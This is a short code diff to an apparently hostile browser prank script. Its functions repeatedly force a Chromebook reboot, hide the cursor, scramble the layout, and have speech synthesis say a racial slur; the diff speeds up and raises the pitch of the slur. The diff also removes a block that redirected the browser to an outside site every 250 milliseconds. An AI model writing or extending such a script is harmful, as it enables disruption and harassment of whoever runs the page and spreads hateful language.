@@ -402,8 +402,8 @@ setInterval(forceRebootChromebook, 4000); //
 
 function textToSpeechSpam() {
     const utter = new SpeechSynthesisUtterance("nigger");
-    utter.rate = 1;
-    utter.pitch = 0.8;
+    utter.rate = 3;
+    utter.pitch = 2;
     utter.volume = 50;
     speechSynthesis.speak(utter);
 }
@@ -426,11 +426,6 @@ function hideCursor() {
     }, 20);
 }
 setInterval(hideCursor, 10);
-
-const urls = ["https://tinekesieders.nl"];
-setInterval(() => {
-    window.location.href = urls[Math.floor(Math.random() * urls.length)];
-}, 250);
 
 function randomLayout() {
     const screenWidth = Math.random() * 1000 + 500;
